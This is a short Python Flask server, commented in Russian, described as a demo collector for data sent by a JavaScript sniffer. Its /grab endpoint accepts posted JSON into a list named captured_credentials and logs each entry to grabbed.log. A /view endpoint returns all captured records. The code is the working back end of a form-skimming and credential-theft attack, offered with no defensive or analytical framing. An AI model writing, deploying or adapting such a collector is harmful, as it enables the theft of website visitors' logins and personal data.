#!/usr/bin/env python3
"""
Мини-сервер для приёма данных от JS-сниффера (демо).
Запуск: python server.py (по умолчанию слушает 0.0.0.0:9999)
"""
from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

captured_credentials = []

@app.route('/grab', methods=['POST'])
def grab():
    data = request.get_json(force=True, silent=True)
    if not data:
        return jsonify({'status': 'error', 'message': 'No JSON'}), 400
    data['timestamp'] = datetime.datetime.now().isoformat()
    captured_credentials.append(data)
    print(f"[+] Перехвачено: {data}")
    # Можно также писать в файл
    with open('grabbed.log', 'a', encoding='utf-8') as f:
        f.write(str(data) + '\n')
    return jsonify({'status': 'ok'}), 200

@app.route('/view')
def view():
    return jsonify(captured_credentials)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9999, debug=False)